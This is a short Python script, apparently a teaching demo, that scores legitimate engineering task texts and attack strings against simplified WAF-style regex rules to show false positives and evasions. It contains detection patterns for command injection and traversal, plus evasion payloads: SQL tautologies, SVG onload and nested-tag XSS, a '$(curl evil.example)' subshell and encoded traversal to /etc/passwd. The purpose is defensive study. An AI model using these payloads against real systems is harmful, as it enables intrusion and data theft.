"""WAF signatures against the factory's own traffic. Simplified, CRS-style rules (NOT the real Core Rule Set):
anomaly scoring, CRITICAL = 5 points, block at 5.
A. Real-looking factory task texts (code-shaped by nature) trip the rules: false positives on legitimate work.
B. Trivial rewrites of actual attacks slip past the same rules: signatures miss what they were not written for."""
import re

RULES = [
    ("sqli-union", r"(?i)\bunion\b.{0,40}\bselect\b", 5),
    ("sqli-tautology", r"(?i)'\s*or\s*'?\d*'?\s*=\s*'?\d*", 5),
    ("sqli-keywords", r"(?i)\b(drop\s+table|insert\s+into|delete\s+from)\b", 5),
    ("xss-script", r"(?i)<script[\s>]", 5),
    ("xss-handler", r"(?i)\bon(error|load|click)\s*=", 5),
    ("cmd-injection", r"(?:;|\|\||&&)\s*(rm|curl|wget|bash|sh)\b", 5),
    ("path-traversal", r"\.\./", 5),
]


def score(text):
    hits = [(name, pts) for name, rx, pts in RULES if re.search(rx, text)]
    return sum(p for _, p in hits), [n for n, _ in hits]


LEGIT_TASKS = [
    "Add a /version endpoint that returns the git sha.",
    "Fix the report query: it should UNION the open and closed runs, then SELECT the newest 20.",
    "Stop XSS in the dashboard: a task like <script>alert(1)</script> must render as text.",
    "Add an onclick= handler to the run list so a row opens its PR.",
    "Write a migration that does DELETE FROM runs WHERE finished_at < now() - interval '30 days'.",
    "Make egress.sh fail closed: if curl fails, exit 1 && print the reason.",
    "Resolve config paths like ../shared/settings.yml relative to the repo root.",
]
ATTACKS = [
    ("' OR '1'='1", "classic tautology"),
    ("'/**/OR/**/1=1--", "comments instead of spaces"),
    ("<svg/onload=alert(1)>", "no space before onload"),
    ("<scr<script>ipt>", "nested tag"),
    ("$(curl evil.example)", "subshell, no ; or &&"),
    ("..%2f..%2fetc%2fpasswd", "URL-encoded traversal"),
]

print("A  legitimate factory tasks")
blocked = 0
for t in LEGIT_TASKS:
    s, hits = score(t)
    blocked += s >= 5
    print(f"A    {'BLOCKED' if s >= 5 else 'passed '} {hits!s:<36} {t[:70]}")
print(f"A  false positives: {blocked}/{len(LEGIT_TASKS)} legitimate tasks blocked")
print("B  attacks")
missed = 0
for payload, how in ATTACKS:
    s, hits = score(payload)
    missed += s < 5
    print(f"B    {'blocked' if s >= 5 else 'MISSED '} {payload:<26} ({how})")
print(f"B  false negatives: {missed}/{len(ATTACKS)} attacks missed")
